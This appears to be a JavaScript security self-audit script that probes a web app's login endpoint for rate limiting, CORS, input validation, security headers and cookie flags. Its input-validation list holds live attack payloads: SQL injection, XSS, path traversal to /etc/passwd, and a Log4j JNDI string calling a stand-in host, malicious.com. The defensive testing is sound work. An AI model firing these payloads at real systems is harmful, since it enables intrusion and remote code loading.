// Security Audit Logging Script
// This script adds logging to validate security assumptions

console.log('=== SECURITY AUDIT LOGS START ===');
console.log('Timestamp:', new Date().toISOString());

// 1. Rate Limiting Test Logs
console.log('\n=== RATE LIMITING TESTS ===');
console.log('Testing authentication endpoints for rate limiting...');

const simulateBruteForce = async () => {
  const attempts = [];
  for (let i = 0; i < 10; i++) {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          email: `test${i}@example.com`, 
          password: 'wrongpassword' 
        })
      });
      attempts.push({
        attempt: i + 1,
        status: response.status,
        rateLimited: response.headers.get('X-RateLimit-Limit') !== null,
        retryAfter: response.headers.get('Retry-After')
      });
    } catch (error) {
      attempts.push({
        attempt: i + 1,
        error: error.message
      });
    }
  }
  return attempts;
};

// 2. CORS Security Test Logs
console.log('\n=== CORS SECURITY TESTS ===');
console.log('Testing CORS configuration...');

const testCORSMisconfiguration = async () => {
  const corsTestUrls = [
    'http://malicious.com',
    'http://localhost:3001',
    'http://evil-site.com'
  ];
  
  const results = [];
  for (const origin of corsTestUrls) {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'OPTIONS',
        headers: {
          'Origin': origin,
          'Access-Control-Request-Method': 'POST',
          'Access-Control-Request-Headers': 'Content-Type'
        }
      });
      
      const corsHeader = response.headers.get('Access-Control-Allow-Origin');
      results.push({
        origin,
        allowed: corsHeader === '*' || corsHeader === origin,
        corsHeader
      });
    } catch (error) {
      results.push({
        origin,
        error: error.message
      });
    }
  }
  return results;
};

// 3. Input Validation Test Logs
console.log('\n=== INPUT VALIDATION TESTS ===');
console.log('Testing for SQL injection and XSS vulnerabilities...');

const testInputValidation = async () => {
  const maliciousInputs = [
    { email: "test' OR '1'='1", password: "password" }, // SQL Injection
    { email: "<script>alert('xss')</script>@example.com", password: "password" }, // XSS
    { email: "test@example.com", password: "<img src=x onerror=alert('xss')>" }, // XSS in password
    { email: "test@example.com", password: "../../../etc/passwd" }, // Path traversal
    { email: "test@example.com", password: "${jndi:ldap://malicious.com/a}" } // Log4j
  ];
  
  const results = [];
  for (const input of maliciousInputs) {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(input)
      });
      
      results.push({
        input: JSON.stringify(input),
        status: response.status,
        validationError: response.status === 400,
        serverError: response.status >= 500
      });
    } catch (error) {
      results.push({
        input: JSON.stringify(input),
        error: error.message
      });
    }
  }
  return results;
};

// 4. Security Headers Test Logs
console.log('\n=== SECURITY HEADERS TESTS ===');
console.log('Testing for security headers...');

const testSecurityHeaders = async () => {
  try {
    const response = await fetch('/api/auth/login', {
      method: 'OPTIONS'
    });
    
    const headers = {};
    const securityHeaders = [
      'Content-Security-Policy',
      'X-Frame-Options',
      'X-Content-Type-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security',
      'Referrer-Policy',
      'Permissions-Policy'
    ];
    
    securityHeaders.forEach(header => {
      headers[header] = response.headers.get(header);
    });
    
    return {
      securityHeadersPresent: Object.values(headers).some(h => h !== null),
      headers
    };
  } catch (error) {
    return { error: error.message };
  }
};

// 5. Session Security Test Logs
console.log('\n=== SESSION SECURITY TESTS ===');
console.log('Testing session management...');

const testSessionSecurity = async () => {
  try {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include'
    });
    
    const setCookieHeader = response.headers.get('set-cookie');
    const cookieAnalysis = {
      hasHttpOnly: setCookieHeader?.includes('HttpOnly') || false,
      hasSecure: setCookieHeader?.includes('Secure') || false,
      hasSameSite: setCookieHeader?.includes('SameSite') || false,
      sameSiteValue: setCookieHeader?.match(/SameSite=([^;]+)/)?.[1] || 'Not set'
    };
    
    return {
      cookieHeader: setCookieHeader,
      security: cookieAnalysis
    };
  } catch (error) {
    return { error: error.message };
  }
};

// Execute all tests and log results
const runSecurityAudit = async () => {
  console.log('Running comprehensive security audit...\n');
  
  try {
    const rateLimitResults = await simulateBruteForce();
    console.log('Rate Limiting Results:', JSON.stringify(rateLimitResults, null, 2));
    
    const corsResults = await testCORSMisconfiguration();
    console.log('CORS Results:', JSON.stringify(corsResults, null, 2));
    
    const inputValidationResults = await testInputValidation();
    console.log('Input Validation Results:', JSON.stringify(inputValidationResults, null, 2));
    
    const securityHeadersResults = await testSecurityHeaders();
    console.log('Security Headers Results:', JSON.stringify(securityHeadersResults, null, 2));
    
    const sessionResults = await testSessionSecurity();
    console.log('Session Security Results:', JSON.stringify(sessionResults, null, 2));
    
    console.log('\n=== SECURITY AUDIT LOGS END ===');
    
    // Summary
    console.log('\n=== SECURITY SUMMARY ===');
    console.log('1. Rate Limiting:', rateLimitResults.some(r => r.rateLimited) ? 'PROTECTED' : 'VULNERABLE');
    console.log('2. CORS Security:', corsResults.some(r => r.allowed && r.origin !== 'http://localhost:3000') ? 'VULNERABLE' : 'PROTECTED');
    console.log('3. Input Validation:', inputValidationResults.some(r => r.serverError) ? 'VULNERABLE' : 'PROTECTED');
    console.log('4. Security Headers:', securityHeadersResults.securityHeadersPresent ? 'PARTIAL' : 'MISSING');
    console.log('5. Session Security:', sessionResults.security?.hasHttpOnly && sessionResults.security?.hasSecure ? 'PROTECTED' : 'VULNERABLE');
    
  } catch (error) {
    console.error('Security audit failed:', error);
  }
};

// Auto-run if in Node.js environment
if (typeof window === 'undefined') {
  runSecurityAudit();
}

module.exports = {
  simulateBruteForce,
  testCORSMisconfiguration,
  testInputValidation,
  testSecurityHeaders,
  testSessionSecurity,
  runSecurityAudit
};